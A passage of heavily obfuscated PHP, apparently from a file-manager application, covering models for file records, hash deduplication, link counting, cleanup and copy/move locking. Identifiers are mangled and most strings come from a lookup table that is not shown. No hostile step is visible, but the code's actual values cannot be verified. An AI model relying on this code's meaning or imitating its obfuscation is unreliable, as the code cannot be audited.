($Ñ¶•‘›ã as &$ı•öÄì‰) { $ı•öÄì‰[$¯µá˜æé[522]] = $áôØûéà[$ı•öÄì‰[$¯µá˜æé[1992]]]; if (isset($ı•öÄì‰[$¯µá˜æé[2002]])) { $ı•öÄì‰[$¯µá˜æé[2002]][$¯µá˜æé[522]] = $áôØûéà[$ı•öÄì‰[$¯µá˜æé[2002]][$¯µá˜æé[1992]]]; } } unset($ı•öÄì‰); } private function metaList($Äò¹İöÃ) { $Æô‘¼Óì =& $_SERVER[Ñ¯©ç]; if (!$Äò¹İöÃ) { return array(); } $€ğÏå­Œ = array($Æô‘¼Óì[1992] => array($Æô‘¼Óì[7], $Äò¹İöÃ)); $·Åƒ•Ü‚ = Model($Æô‘¼Óì[2003])->where($€ğÏå­Œ)->select(); $·Åƒ•Ü‚ = array_to_keyvalue_group($·Åƒ•Ü‚, $Æô‘¼Óì[1992]); foreach ($·Åƒ•Ü‚ as $Ë¾îÓ‚Á => $ÓäÈ±ªš) { $Ó‡ôú•İ = array(); foreach ($ÓäÈ±ªš as $“Ê…¶ı) { $Ó‡ôú•İ[$“Ê…¶ı[$Æô‘¼Óì[107]]] = $“Ê…¶ı[$Æô‘¼Óì[434]]; } $·Åƒ•Ü‚[$Ë¾îÓ‚Á] = $Ó‡ôú•İ; } return $·Åƒ•Ü‚ ? $·Åƒ•Ü‚ : array(); } public function removeTarget($ûá”‡«, $¹Ğª¼Œİ) { $Ş¡»—úï =& $_SERVER[Ñ¯©ç]; if (!$¹Ğª¼Œİ) { return !0; } $¹Ğª¼Œİ = is_array($¹Ğª¼Œİ) ? $¹Ğª¼Œİ : array($¹Ğª¼Œİ); $ê”Õ¤Î… = array($Ş¡»—úï[191] => $ûá”‡«, $Ş¡»—úï[553] => array($Ş¡»—úï[7], $¹Ğª¼Œİ)); $Î„İÇ—æ = $this->field($Ş¡»—úï[1992])->where($ê”Õ¤Î…)->select(); $ª ¶‘ëÜ = array_to_keyvalue($Î„İÇ—æ, $Ş¡»—úï[12], $Ş¡»—úï[1992]); if (!$ª ¶‘ëÜ) { return !0; } $ê”Õ¤Î… = array($Ş¡»—úï[1992] => array($Ş¡»—úï[7], $ª ¶‘ëÜ)); $this->where($ê”Õ¤Î…)->delete(); Model($Ş¡»—úï[1995])->where($ê”Õ¤Î…)->delete(); Model($Ş¡»—úï[2004])->where($ê”Õ¤Î…)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\154\145\137\x63\157\156\x74\145\x6e\x74\163"; protected $dataAuto = array(array("\143\162\145\141\164\x65\124\151\155\145", "\x74\151\x6d\145", "\x69\156\x73\x65\x72\x74", "\x66\165\x6e\x63\x74\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\x6c\x65"; protected $tableMeta = array("\164\141\142\154\145\x4e\141\155\x65" => "\x69\x6f\137\x66\151\154\x65\137\155\145\x74\x61", "\155\x65\164\141\106\x69\145\154\144" => "\x66\151\x6c\145\111\104"); public function fileInfo($ÆÌ•âï£) { $õ•‹“î¸ =& $_SERVER[Ñ¯©ç]; static $¢­§Óéû = array(); if (!isset($¢­§Óéû[$ÆÌ•âï£])) { $şÒ¢ÚïÒ = $õ•‹“î¸[2005]; $âê÷£æ = Model($õ•‹“î¸[527])->field($şÒ¢ÚïÒ)->where(array($õ•‹“î¸[525] => $ÆÌ•âï£))->find(); $¢­§Óéû[$ÆÌ•âï£] = $âê÷£æ; } return $¢­§Óéû[$ÆÌ•âï£]; } public function addFileByContent($’·Ø¾¶³ = '', $ĞÕ×İÇı = '') { $‘éŞºº¶ =& $_SERVER[Ñ¯©ç]; $ŠĞûŞµ = TEMP_PATH . $‘éŞºº¶[2006]; if (!is_dir($ŠĞûŞµ)) { mk_dir($ŠĞûŞµ); } $†Ãª–ê£ = $ŠĞûŞµ . $‘éŞºº¶[2007] . rand_string(16); file_put_contents($†Ãª–ê£, $’·Ø¾¶³); $öÜ¸¼¨‘ = $this->addFile($†Ãª–ê£, $ĞÕ×İÇı, !0); if (file_exists($†Ãª–ê£)) { @unlink($†Ãª–ê£); } return $öÜ¸¼¨‘; } public function createFileName($µĞƒ÷Á­, $€û–ªö = false, $•ÂˆØÊ¦ = false) { $€«·óËÁ =& $_SERVER[Ñ¯©ç]; $ƒá©ˆÓÉ = IO::init($€«·óËÁ[8]); $‡õœ¥òÈ = $this->makeFilePath($µĞƒ÷Á­, $ƒá©ˆÓÉ, $€û–ªö, $•ÂˆØÊ¦); $Ê²ÁùÕı = $ƒá©ˆÓÉ->pathFather($‡õœ¥òÈ); static $ “àèó­ = false; $İ®®™î = $€«·óËÁ[2008] . md5($Ê²ÁùÕı); if (!$ “àèó­ && !Cache::get($İ®®™î)) { $ “àèó­ = !0; $ƒ›ÜÖüõ = IO::mkdir($Ê²ÁùÕı); if (!IO::exist($ƒ›ÜÖüõ . $€«·óËÁ[849])) { IO::mkfile($ƒ›ÜÖüõ . $€«·óËÁ[849]); } Cache::set($İ®®™î, 1, 3600 * 2); } return $‡õœ¥òÈ; } public function makeFilePath($¨îõš»á, $‚º£Ïä, $Ğ¨™õ¶ = false, $–ò¤ª¤ = false) { $ı—ïÇË• =& $_SERVER[Ñ¯©ç]; $Ì®“À¶ = Model($ı—ïÇË•[823])->get($ı—ïÇË•[2009]); $ª­·µ´ = KodIO::defaultIO() . date($ı—ïÇË•[2010]); $³Ãµ»« = $ª­·µ´ . rand_string(5) . short_id(100); $¨îõš»á = str_replace($ı—ïÇË•[8], $ı—ïÇË•[11], KodIO::clear($¨îõš»á)); $óªö²¬Ò = $‚º£Ïä->ext($¨îõš»á); if (!$¨îõš»á) { $Ì®“À¶ = $ı—ïÇË•[2011]; } switch ($Ì®“À¶) { case $ı—ïÇË•[2012]: if ($óªö²¬Ò) { $³Ãµ»« = $³Ãµ»« . $ı—ïÇË•[10] . $óªö²¬Ò; } if ($óªö²¬Ò == $ı—ïÇË•[1948]) { $³Ãµ»« .= $ı—ïÇË•[1263]; } break; case $ı—ïÇË•[2013]: $ÓÊ¬ëÚÍ = Model($ı—ïÇË•[823])->get($ı—ïÇË•[824]); $ª´·Í«ß = substr(md5($ı—ïÇË•[825] . $ÓÊ¬ëÚÍ . date($ı—ïÇË•[801])), 0, 8); $ÚŸŠâ¿¯ = KodIO::defaultDriver(); $ª­·µ´ = $ı—ïÇË•[1294] . $ÚŸŠâ¿¯[$ı—ïÇË•[458]] . $ı—ïÇË•[467] . date($ı—ïÇË•[2014]) . $ª´·Í«ß . $ı—ïÇË•[8]; if ($óªö²¬Ò == $ı—ïÇË•[1948]) { $¨îõš»á .= $ı—ïÇË•[1263]; } $­’Òûİı = $ı—ïÇË•[2015] . $ª­·µ´ . $¨îõš»á; CacheLock::lock($­’Òûİı); $³Ãµ»« = $ª­·µ´ . $¨îõš»á; if (IO::exist($ª­·µ´ . $¨îõš»á)) { $Ñº¨èÈ = substr($¨îõš»á, 0, strlen($¨îõš»á) - strlen($óªö²¬Ò)); $ÜèÃ®—Ú = $–ò¤ª¤ ? substr($–ò¤ª¤, 0, 5) : ($Ğ¨™õ¶ ? substr($Ğ¨™õ¶, 0, 5) : rand_string(5)); $³Ãµ»« = $ª­·µ´ . $Ñº¨èÈ . $ÜèÃ®—Ú; if ($óªö²¬Ò) { $³Ãµ»« = $³Ãµ»« . $ı—ïÇË•[10] . $óªö²¬Ò; } } if (IO::isOsDriver($³Ãµ»«) && !IO::isUploadServer($³Ãµ»«)) { if (IO::exist($³Ãµ»«)) { return $³Ãµ»«; } $¨®›ˆÚ = IO::setContent($³Ãµ»«, $ı—ïÇË•[12]); if (!$¨®›ˆÚ) { show_json($ı—ïÇË•[2016], !1); } } CacheLock::unlock($­’Òûİı); break; case $ı—ïÇË•[2011]: break; default: break; } return $³Ãµ»«; } public function addFileByRemote($©‡®üĞ, $Ášó†¢Æ, $æ•§Ö‚² = array()) { $™øô‹šú =& $_SERVER[Ñ¯©ç]; if (!IO::exist($©‡®üĞ)) { return !1; } $ÆßšÕÓÆ = $æ•§Ö‚²[$™øô‹šú[530]] ? $æ•§Ö‚²[$™øô‹šú[530]] : $™øô‹šú[12]; $´Š™Õœ = IO::hashMd5($©‡®üĞ, $ÆßšÕÓÆ); $šÍ“¹ŞĞ = KodIO::defaultDriver(); $¢Ğ´ò«¥ = array($™øô‹šú[600] => IO::size($©‡®üĞ), $™øô‹šú[2017] => 1, $™øô‹šú[477] => $Ášó†¢Æ, $™øô‹šú[860] => $šÍ“¹ŞĞ[$™øô‹šú[458]], $™øô‹šú[478] => $©‡®üĞ, $™øô‹šú[2018] => $æ•§Ö‚²[$™øô‹šú[655]] ? $æ•§Ö‚²[$™øô‹šú[655]] : IO::hashSimple($©‡®üĞ), $™øô‹šú[2019] => $´Š™Õœ ? $´Š™Õœ : $ÆßšÕÓÆ); if ($Ğ†Ã÷Äò = $this->addFileCheckExist($¢Ğ´ò«¥[$™øô‹šú[655]], $¢Ğ´ò«¥[$™øô‹šú[530]], $¢Ğ´ò«¥[$™øô‹šú[89]])) { return $Ğ†Ã÷Äò; } return $this->addFileData($¢Ğ´ò«¥); } private function addFileData($ŒÊ”‡±) { $ËÁçÑ ‹ =& $_SERVER[Ñ¯©ç]; if (!$ŒÊ”‡±) { return !1; } $ŒÊ”‡±[$ËÁçÑ ‹[89]] = intval($ŒÊ”‡±[$ËÁçÑ ‹[89]]); if (!$ŒÊ”‡±[$ËÁçÑ ‹[89]] && strlen($ŒÊ”‡±[$ËÁçÑ ‹[655]]) > 32) { $ŒÊ”‡±[$ËÁçÑ ‹[89]] = intval(substr($ŒÊ”‡±[$ËÁçÑ ‹[655]], 32)); } $÷–¶ÌúÕ = $this->add($ŒÊ”‡±); return $this->find($÷–¶ÌúÕ); } public function addFile($ùÙö¥â¿, $äÇÀÏêÙ, $Šï‹÷õî = false) { $Ñ·´ş¬À =& $_SERVER[Ñ¯©ç]; $Ñ™†òô = IO::hashSimple($ùÙö¥â¿); $¢Í¤«Û« = IO::size($ùÙö¥â¿); $æ¨Á™ª = $¢Í¤«Û« <= 1024 * 1024 * 10 ? IO::hashMd5($ùÙö¥â¿) : $Ñ·´ş¬À[12]; $ŒˆÀŒşŞ = $Ñ·´ş¬À[2020] . $Ñ™†òô; CacheLock::lock($ŒˆÀŒşŞ); if ($æ¨Á™ª && $Ñ™†òô) { $ËÒîßŠ = $this->addFileCheckExist($Ñ™†òô, $æ¨Á™ª, $¢Í¤«Û«); if ($ËÒîßŠ) { CacheLock::unlock($ŒˆÀŒşŞ); return $ËÒîßŠ; } } $ùÅîœ°ã = $this->addFileMake($ùÙö¥â¿, $¢Í¤«Û«, $Ñ™†òô, $æ¨Á™ª, $äÇÀÏêÙ, $Šï‹÷õî); $àÈß˜ · = $this->addFileData($ùÅîœ°ã); CacheLock::unlock($ŒˆÀŒşŞ); if (!$æ¨Á™ª && $àÈß˜ ·) { $this->fileMd5Check($àÈß˜ ·); } return $àÈß˜ ·; } public function fileMd5Check($°™õÀç…) { $èï€‚í— =& $_SERVER[Ñ¯©ç]; $® ”çØ = array($°™õÀç…[$èï€‚í—[524]], $°™õÀç…[$èï€‚í—[97]]); $†¿­ıĞÈ = $èï€‚í—[2021] . $°™õÀç…[$èï€‚í—[97]]; $è÷û¯Ö¸ = $èï€‚í—[2022] . $°™õÀç…[$èï€‚í—[524]]; TaskQueue::add($èï€‚í—[2023], $® ”çØ, $†¿­ıĞÈ, $è÷û¯Ö¸); } public function fileMd5Set($½›˜Ğ£¿, $âçşÖæÀ) { $æÀéïßò =& $_SERVER[Ñ¯©ç]; $úÄË± = $this->find($½›˜Ğ£¿); if (!$úÄË± || $úÄË±[$æÀéïßò[530]]) { return; } $¼¤úÈ©è = IO::hashMd5($âçşÖæÀ); if (!$¼¤úÈ©è) { return $æÀéïßò[12]; } $this->where(array($æÀéïßò[524] => $½›˜Ğ£¿))->save(array($æÀéïßò[530] => $¼¤úÈ©è)); } public function addFileMake($úŸÎí”‘, $åå»¼ß, $Şî¹±òÖ, $÷¸ÙÚâû, $à¹¥—•¯, $Í¹³¢¿ü) { $ï‚©²Òá =& $_SERVER[Ñ¯©ç]; $çÚ§Öö¦ = $this->createFileName($à¹¥—•¯, $Şî¹±òÖ, $÷¸ÙÚâû); $ü“Æø‘í = get_path_father($çÚ§Öö¦); $ÛŠè¥‘ = get_path_this($çÚ§Öö¦); if ($Í¹³¢¿ü) { $ŠÕì±ü = IO::move($úŸÎí”‘, $ü“Æø‘í, !1, $ÛŠè¥‘); } else { $ŠÕì±ü = IO::copy($úŸÎí”‘, $ü“Æø‘í, !1, $ÛŠè¥‘); } if (!$ŠÕì±ü) { return !1; } $£‚áµ²é = KodIO::defaultDriver(); $µ™¸ığÊ = array($ï‚©²Òá[600] => $åå»¼ß, $ï‚©²Òá[2017] => 1, $ï‚©²Òá[477] => $à¹¥—•¯, $ï‚©²Òá[860] => $£‚áµ²é[$ï‚©²Òá[458]], $ï‚©²Òá[478] => $çÚ§Öö¦, $ï‚©²Òá[2018] => $Şî¹±òÖ, $ï‚©²Òá[2019] => $÷¸ÙÚâû); return $µ™¸ığÊ; } public function addFileCheckExist($‘ÕÃï¹è, $‰Ÿ„ˆí„, $â„Ù†Áñ) { $ÕŸÇÛ¬Ğ =& $_SERVER[Ñ¯©ç]; $¶ÁÓš°Ê = $this->findByHash($‘ÕÃï¹è, $‰Ÿ„ˆí„); if (!$¶ÁÓš°Ê) { return !1; } $Î£óòøº = array($ÕŸÇÛ¬Ğ[2017] => intval($¶ÁÓš°Ê[$ÕŸÇÛ¬Ğ[2024]]) + 1, $ÕŸÇÛ¬Ğ[600] => $â„Ù†Áñ); $this->where(array($ÕŸÇÛ¬Ğ[525] => $¶ÁÓš°Ê[$ÕŸÇÛ¬Ğ[524]]))->save($Î£óòøº); return $¶ÁÓš°Ê; } public function remove($ÁÒèĞ™) { $this->linkCountChange($ÁÒèĞ™, !1); $this->clearEmpty(); return !0; } public function linkAdd($µØåğ™Ã) { $this->linkCountChange($µØåğ™Ã, !0); } public function linkCountChange($Çğâ€‘, $­×Ûú­ø) { $•Ñµ´İ™ =& $_SERVER[Ñ¯©ç]; if (!$Çğâ€‘) { return; } if (!is_array($Çğâ€‘)) { $Çğâ€‘ = array($Çğâ€‘); } $ÁÇ¨¸ = array(); foreach ($Çğâ€‘ as $œ¹Å»Ùâ) { $ÆÙÆÇÉ¨ = $œ¹Å»Ùâ . $•Ñµ´İ™[12]; if (!$ÁÇ¨¸[$ÆÙÆÇÉ¨]) { $ÁÇ¨¸[$ÆÙÆÇÉ¨] = 0; } $ÁÇ¨¸[$ÆÙÆÇÉ¨]++; } $ÆÔË¹éˆ = array(); foreach ($ÁÇ¨¸ as $œ¹Å»Ùâ => $Çƒ§¤®ı) { $ÆÙÆÇÉ¨ = $Çƒ§¤®ı . $•Ñµ´İ™[12]; if (!$ÆÔË¹éˆ[$ÆÙÆÇÉ¨]) { $ÆÔË¹éˆ[$ÆÙÆÇÉ¨] = array(); } $ÆÔË¹éˆ[$ÆÙÆÇÉ¨][] = $œ¹Å»Ùâ; } foreach ($ÆÔË¹éˆ as $Çƒ§¤®ı => $‘ÊåÈïÂ) { if (!$‘ÊåÈïÂ) { continue; } $Çƒ§¤®ı = $­×Ûú­ø ? $Çƒ§¤®ı : -intval($Çƒ§¤®ı); $»›¹ñÆÊ = array($•Ñµ´İ™[524] => array($•Ñµ´İ™[7], $‘ÊåÈïÂ)); if ($Çƒ§¤®ı < 0) { $»›¹ñÆÊ[$•Ñµ´İ™[2024]] = array($•Ñµ´İ™[1068], abs($Çƒ§¤®ı)); } $this->where($»›¹ñÆÊ)->setAdd($•Ñµ´İ™[2024], $Çƒ§¤®ı); } } public function findByHash($­şâ’“, $¬¶… Âı = false) { $ùÊ¹Öü‡ =& $_SERVER[Ñ¯©ç]; if (!$­şâ’“ && !$¬¶… Âı) { return !1; } $Ø¯°‘‚¸ = array($ùÊ¹Öü‡[2018] => $­şâ’“); if ($¬¶… Âı) { $Ø¯°‘‚¸ = array($ùÊ¹Öü‡[2019] => $¬¶… Âı); } return $this->order($ùÊ¹Öü‡[2025])->where($Ø¯°‘‚¸)->find(); } public function clearEmpty($âÄçê–è = 2) { $š´¢µÌ– =& $_SERVER[Ñ¯©ç]; $Âô®şæË = time() - 3600 * 24 * $âÄçê–è; $ŞßÃ­¤À = $š´¢µÌ–[2026] . $Âô®şæË; $úğ‰ëĞœ = $this->where($ŞßÃ­¤À)->select(); if (!$úğ‰ëĞœ) { return; } $´ŞÂ‡ßİ = new Task($š´¢µÌ–[2027], $š´¢µÌ–[12], count($úğ‰ëĞœ)); foreach ($úğ‰ëĞœ as $áğ³Éë£) { $´ŞÂ‡ßİ->update(1); $this->resetFile($áğ³Éë£); } $´ŞÂ‡ßİ->end(); } public function resetFile($£¢ŠçŒ) { $×æîúÜÂ =& $_SERVER[Ñ¯©ç]; $Â•Ùõ³¹ = array($×æîúÜÂ[525] => $£¢ŠçŒ[$×æîúÜÂ[524]]); $é¾é¤ãÔ = Model($×æîúÜÂ[1391])->where($Â•Ùõ³¹)->count(); $ÏÂÅÚÒÔ = Model($×æîúÜÂ[2028])->where($Â•Ùõ³¹)->count(); $Åäâïª’ = intval($é¾é¤ãÔ) + intval($ÏÂÅÚÒÔ); if ($Åäâïª’ == 0) { IO::remove($£¢ŠçŒ[$×æîúÜÂ[97]]); Model($×æîúÜÂ[2029])->delete($£¢ŠçŒ[$×æîúÜÂ[524]]); $this->where($Â•Ùõ³¹)->delete(); $this->metaSet($£¢ŠçŒ[$×æîúÜÂ[524]], null, null); return; } if ($£¢ŠçŒ[$×æîúÜÂ[2024]] != $Åäâïª’) { $this->where($Â•Ùõ³¹)->save(array($×æîúÜÂ[2017] => $Åäâïª’)); } } public function storageInfo($À„ŸœÑÜ = false) { $æ§ëµ¹Á =& $_SERVER[Ñ¯©ç]; $ï‚ÈèŸ = $this->count() + 0.0; $Ö˜ãĞæ = 0; $©Ô‡§Ñ = 1; $ã¶ÏÃÏ = 0; $ùË‹ˆÈ° = 5000; for ($¢ÑÚ¡Ê¡ = 0; $¢ÑÚ¡Ê¡ < $ï‚ÈèŸ; $¢ÑÚ¡Ê¡ = $¢ÑÚ¡Ê¡ + $ùË‹ˆÈ°) { $µÎË”š = $this->limit($¢ÑÚ¡Ê¡, $¢ÑÚ¡Ê¡ + $ùË‹ˆÈ°)->select(); foreach ($µÎË”š as $ÌßÙ²­) { $©Ô‡§Ñ += $ÌßÙ²­[$æ§ëµ¹Á[89]] * $ÌßÙ²­[$æ§ëµ¹Á[2024]]; $Ö˜ãĞæ += $ÌßÙ²­[$æ§ëµ¹Á[89]] * ($ÌßÙ²­[$æ§ëµ¹Á[2024]] - 1); $ã¶ÏÃÏ += $ÌßÙ²­[$æ§ëµ¹Á[2024]]; } } $ö˜ŠÆÂ = array($æ§ëµ¹Á[2030] => $©Ô‡§Ñ, $æ§ëµ¹Á[2031] => $Ö˜ãĞæ, $æ§ëµ¹Á[2032] => $Ö˜ãĞæ / $©Ô‡§Ñ, $æ§ëµ¹Á[93] => $ï‚ÈèŸ, $æ§ëµ¹Á[2033] => $ã¶ÏÃÏ); return $ö˜ŠÆÂ; } } goto C¸³—³‚¨ã; Fì¤å±¼»®: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ËÆ…Á·Ü) { $í¬ˆ°‚Ú =& $_SERVER[Ñ¯©ç]; if (!$this->allowLock()) { return; } $this->_lockCheck($í¬ˆ°‚Ú[601], $ËÆ…Á·Ü); $¹èƒÊÍô = 1; $this->_lockEvent($ËÆ…Á·Ü, array($í¬ˆ°‚Ú[602], $í¬ˆ°‚Ú[603]), $¹èƒÊÍô); $this->_lockParent($ËÆ…Á·Ü, array($í¬ˆ°‚Ú[603]), $¹èƒÊÍô); $this->_lockEvent($ËÆ…Á·Ü, array($í¬ˆ°‚Ú[604], $í¬ˆ°‚Ú[605]), $¹èƒÊÍô); $this->_lockCheckEnd($í¬ˆ°‚Ú[601], $ËÆ…Á·Ü); } public function lockCopyEnd($¨‚ÒÚ‹©) { $Õç³‡©é =& $_SERVER[Ñ¯©ç]; if (!$this->allowLock()) { return; } $‰æªå¯ = 0; $this->_lockEvent($¨‚ÒÚ‹©, array($Õç³‡©é[602], $Õç³‡©é[603]), $‰æªå¯); $this->_lockParent($¨‚ÒÚ‹©, array($Õç³‡©é[603]), $‰æªå¯); $this->_lockEvent($¨‚ÒÚ‹©, array($Õç³‡©é[604], $Õç³‡©é[605]), $‰æªå¯); } public function lockWriteStart($İİã‰¶Ç, $ıĞ¯ĞÔÏ = '') { $õĞÉçä =& $_SERVER[Ñ¯©ç]; if (!$this->allowLock()) { return; } $this->_lockCheck($õĞÉçä[602], $İİã‰¶Ç); $”ñü¶›ê = 1; $this->_lockKey($õĞÉçä[606] . $İİã‰¶Ç . $õĞÉçä[10] . $ıĞ¯ĞÔÏ, $”ñü¶›ê); $this->_lockEvent($İİã‰¶Ç, array($õĞÉçä[601], $õĞÉçä[603]), $”ñü¶›ê); $this->_lockParent($İİã‰¶Ç, array($õĞÉçä[601], $õĞÉçä[603]), $”ñü¶›ê); $this->_lockCheckEnd($õĞÉçä[602], $İİã‰¶Ç); } public function lockWriteEnd($€Ò‡æÉ, $ª›ÔÊ·… = '') { $ÜË™œ ş =& $_SERVER[Ñ¯©ç]; if (!$this->allowLock()) { return; } $”ƒÓÒÒ = 0; $this->_lockKey($ÜË™œ ş[606] . $€Ò‡æÉ . $ÜË™œ ş[10] . $ª›ÔÊ·…, $”ƒÓÒÒ); $this->_lockEvent($€Ò‡æÉ, array($ÜË™œ ş[601], $ÜË™œ ş[603]), $”ƒÓÒÒ); $this->_lockParent($€Ò‡æÉ, array($ÜË™œ ş[601], $ÜË™œ ş[603]), $”ƒÓÒÒ); } public function lockMoveStart($¸ı) { $ÓÆóÜ†— =& $_SERVER[Ñ¯©ç]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÓÆóÜ†—[603], $¸ı); $ìŞæû = 1; $this->_lockKey($ÓÆóÜ†—[607] . $¸ı, $ìŞæû); $this->_lockEvent($¸ı, array($ÓÆóÜ†—[601], $ÓÆóÜ†—[602]), $ìŞæû); $this->_lockParent($¸ı, array($ÓÆóÜ†—[601], $ÓÆóÜ†—[603]), $ìŞæû); $this->_lockEvent($¸ı, array($ÓÆóÜ†—[608], $ÓÆóÜ†—[604], $ÓÆóÜ†—[605]), $ìŞæû); $this->_lockCheckEnd($ÓÆóÜ†—[603], $¸ı); } public function lockMoveEnd($ô–Á¿ƒü) { $ÀÎ¯²…¹ =& $_SERVER[Ñ¯©ç]; if (!$this->allowLock()) { return; } $Ç´à¢°î = 0; $this->_lockKey($ÀÎ¯²…¹[607] . $ô–Á¿ƒü, $Ç´à¢°î); $this->_lockEvent($ô–Á¿ƒü, array($ÀÎ¯²…¹[601], $ÀÎ¯²…¹[602]), $Ç´à¢°î); $this->_lockParent($ô–Á¿ƒü, array($ÀÎ¯²…¹[601], $ÀÎ¯²…¹[603]), $Ç´à¢°î); $this->_lockEvent($ô–Á¿ƒü, array($ÀÎ¯²…¹[608], $ÀÎ¯²…¹[604], $ÀÎ¯²…¹[605]), $Ç´à¢°î); } private function _lockCheck($°«™‘ºû, $Ü°¢×ü‚) { $ËË´¶¦ =& $_SERVER[Ñ¯©ç]; $ÈçêÉ¸Ì = $this->sourceInfo($Ü°¢×ü‚); $Î œÍ¾Í = $°«™‘ºû . $ËË´¶¦[10] . $Ü°¢×ü‚; $this->_lockTimeStart[$Î œÍ¾Í] = timeFloat(); if (!is_array($ÈçêÉ¸Ì)) { return; } $Æ—‘ÉÑ¹ = LNG($ËË´¶¦[609]); CacheLock::setErrorMsg($ËË´¶¦[176] . htmlspecialchars($ÈçêÉ¸Ì[$ËË´¶¦[32]]) . $ËË´¶¦[178] . $Æ—‘ÉÑ¹); $this->_lockKey($Î œÍ¾Í, 1); $this->_lockKey($Î œÍ¾Í, 0); $™Çö¶ä = array_reverse($this->parentLevelArray($ÈçêÉ¸Ì[$ËË´¶¦[568]])); foreach ($™Çö¶ä as $£²³) { $Î œÍ¾Í = $°«™‘ºû . $ËË´¶¦[610] . $£²³; if (CacheLock::lockGet($ËË´¶¦[611] . $Î œÍ¾Í)) { $ÈçêÉ¸Ì = $this->sourceInfo($£²³); CacheLock::setErrorMsg($ËË´¶¦[176] . htmlspecialchars($ÈçêÉ¸Ì[$ËË´¶¦[32]]) . $ËË´¶¦[178] . $Æ—‘ÉÑ¹); $this->_lockKey($Î œÍ¾Í, 1); $this->_lockKey($Î œÍ¾Í, 0); } } } private function _lockCheckEnd($‚«¿â÷€, $«»Ì€óÒ) { $Â–½ˆ‘î =& $_SERVER[Ñ¯©ç]; $•ÆÈ¥ = $‚«¿â÷€ . $Â–½ˆ‘î[10] . $«»Ì€óÒ; CacheLock::setErrorMsg($Â–½ˆ‘î[63]); if (!isset($this->_lockTimeStart[$•ÆÈ¥])) { return; } $Ñµãİöã = timeFloat() - $this->_lockTimeStart[$•ÆÈ¥]; unset($this->_lockTimeStart[$•ÆÈ¥]); if ($Ñµãİöã > 0.5) { unset(self::$cacheSourceInfo[$Â–½ˆ‘î[516] . $«»Ì€óÒ]); } $¶áİ‰Œ— = $this->sourceInfo($«»Ì€óÒ); if (!$¶áİ‰Œ—) { show_json(LNG($Â–½ˆ‘î[118]), !1); } } private function _lockParent($—û×ú‚, $ÏıÛà–Ï, $Ç„ùó˜Œ) { if (!$this->autoLockSet) { return; } $Íß²¨ª = $this->sourceInfo($—û×ú‚); if (!is_array($Íß²¨ª)) { return; } $½ÛœãüÁ = array_reverse($this->parentLevelArray($Íß²¨ª[$_SERVER[Ñ¯©ç][568]])); foreach ($½ÛœãüÁ as $‘¨ ‡) { $this->_lockEvent($‘¨ ‡, $ÏıÛà–Ï, $Ç„ùó˜Œ); } } private function _lockEvent($¸’ü²›®, $‘ãÄÉ•ø, $œ¹’©ú‡) { $…ªµ£ËÍ =& $_SERVER[Ñ¯©ç]; if (!$this->autoLockSet) { return; } foreach ($‘ãÄÉ•ø as $¼°éèÏ) { $ÛÎİİˆÔ = $¼°éèÏ . $…ªµ£ËÍ[10] . $¸’ü²›®; if ($œ¹’©ú‡ && CacheLock::lockGet($…ªµ£ËÍ[611] . $ÛÎİİˆÔ)) { continue; } $this->_lockKey($ÛÎİİˆÔ, $œ¹’©ú‡); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÙæŞ€­§, $Î»°çÀˆ = 1) { $ ó­ÒáÅ = $_SERVER[Ñ¯©ç][611] . md5($ÙæŞ€­§); if ($Î»°çÀˆ) { if (isset(self::$_lockItemArr[$ ó­ÒáÅ])) { return; } self::$_lockItemArr[$ ó­ÒáÅ] = 1; CacheLock::lock($ ó­ÒáÅ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ ó­ÒáÅ])) { return; } unset(self::$_lockItemArr[$ ó­ÒáÅ]); CacheLock::unlock($ ó­ÒáÅ); } } public function isParentOf($ÏÎÔ¨¡µ, $¸îŒëä“) { $¢«‘§ê =& $_SERVER[Ñ¯©ç]; $ÍÆú¡Œ = $this->sourceInfo($ÏÎÔ¨¡µ); $Ôö¬ôç = $this->sourceInfo($¸îŒëä“); $ñ¾±Ó»‘ = $ÍÆú¡Œ[$¢«‘§ê[568]] . $ÍÆú¡Œ[$¢«‘§ê[194]] . $¢«‘§ê[50]; $ÉÕÊËÉ˜ = $Ôö¬ôç[$¢«‘§ê[568]] . $Ôö¬ôç[$¢«‘§ê[194]] . $¢«‘§ê[50]; $¦ôÑİ­æ = strpos($ÉÕÊËÉ˜, $ñ¾±Ó»‘) === 0; return $¦ôÑİ­æ; } private $targetIsDelete = 0; public function copy($ôĞ™Ñä¨, $·¯ûõˆ¿, $ÔšºÜ = REPEAT_REPLACE, $¨æ‰¹Ê  = '') { $±áòÏ =& $_SERVER[Ñ¯©ç]; $¼üÙƒ·› = $this->sourceInfo($ôĞ™Ñä¨); $…¾æ¸’Ü = $this->sourceInfo($·¯ûõˆ¿); if (!$¼üÙƒ·› || !$…¾æ¸’Ü || $…¾æ¸’Ü[$±áòÏ[468]] != $±áòÏ[101]) { return !1; } if ($this->isParentOf($ôĞ™Ñä¨, $·¯ûõˆ¿)) { return !1; } $ä€Ò÷Ì = $¨æ‰¹Ê  ? $¨æ‰¹Ê  : $¼üÙƒ·›[$±áòÏ[32]]; $this->lockCopyStart($ôĞ™Ñä¨); $this->lockWriteStart($·¯ûõˆ¿, $ä€Ò÷Ì); $ù²Ø¹úå = array($±áòÏ[612] => array(), $±áòÏ[613] => array(), $±áòÏ[614] => array()); $this->targetIsDelete = intval($¼üÙƒ·›[$±áòÏ[488]]); $´èªËİŠ = $this->fileNameExistAuto($·¯ûõˆ¿, $¼üÙƒ·›); $¼¦¡»€¨ = $this->_copy($ôĞ™Ñä¨, $·¯ûõˆ¿, $ÔšºÜ, $ù²Ø¹úå, !0, $¨æ‰¹Ê ); $this->_childrenListClear(); $this->lockCopyEnd($ôĞ™Ñä¨); $this->lockWriteEnd($·¯ûõˆ¿, $ä€Ò÷Ì); if ($¼üÙƒ·›[$±áòÏ[468]] == $±áòÏ[101] && $´èªËİŠ == $¼¦¡»€¨) { $this->folderSizeResetChildren($´èªËİŠ); } Model($±áòÏ[615])->addAll($ù²Ø¹úå[$±áòÏ[613]], array(), !0); if ($´èªËİŠ != $¼¦¡»€¨ || $¼üÙƒ·›[$±áòÏ[468]] == $±áòÏ[101]) { Model($±áòÏ[616])->eventCopy($¼¦¡»€¨); } 